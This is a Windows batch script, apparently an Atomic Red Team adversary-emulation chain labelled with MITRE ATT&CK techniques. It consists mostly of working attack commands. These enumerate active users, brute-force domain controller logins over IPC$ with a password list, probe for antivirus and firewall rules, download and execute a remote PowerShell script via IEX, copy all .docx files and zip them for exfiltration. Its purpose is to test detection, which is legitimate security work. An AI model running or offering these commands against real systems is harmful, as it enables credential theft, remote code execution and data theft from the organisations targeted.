:: Chain Reaction - Reactor
::
::

:: Tactic: Discovery
:: Technique: System Owner/User Discovery: https://attack.mitre.org/wiki/Technique/T1033

:: Single Endpoint

:: for /F "tokens=1,2" %%i in ('qwinsta /server:<COMPUTERNAME> ^| findstr "Active Disc"') do @echo %%i | find /v "#" | find /v "console" || echo %%j > usernames.txt

:: Multiple Endpoints

@FOR /F %%n in (computers.txt) DO @FOR /F "tokens=1,2" %%i in ('qwinsta /server:%%n ^| findstr "Active Disc"’) do @echo %%i | find /v "#" | find /v "console" || echo %%j > usernames.txt


:: Tactic: Credential Access, Lateral Movement
:: Technique: Brute Force: https://attack.mitre.org/wiki/Technique/T1110
:: Technique: Windows Admin Shares: https://attack.mitre.org/wiki/Technique/T1077

@FOR /F %%n in (usernames.txt) DO @FOR /F %%p in (passwords.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%%n %%p 1>NUL 2>&1 && @echo [*] %%n:%%p && @net use /delete \\COMPANYDC1\IPC$ > NUL


:: Tactic: Discovery
:: Technique: Security Software Discovery: https://attack.mitre.org/wiki/Technique/T1063

netsh.exe advfirewall firewall show rule name=all

tasklist.exe | findstr cb

tasklist.exe | findstr virus

tasklist.exe | findstr defender

:: Tactic: Execution, Discovery
:: Technique: PowerShell: https://attack.mitre.org/wiki/Technique/T1086
:: Technique: Multiple Discovery

powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')"

:: Tactic: Collection
:: Technique: Automated Collection: https://attack.mitre.org/wiki/Technique/T1119

for /R c: %%f in (*.docx) do copy %%f c:\temp\

:: Tactic: Exfiltration
:: Technique: Data Compressed: https://attack.mitre.org/wiki/Technique/T1002

cmd.exe /c powershell.exe Compress-Archive -Path C:\temp\* -CompressionLevel Optimal -DestinationPath C:\temp\allthedataz.zip
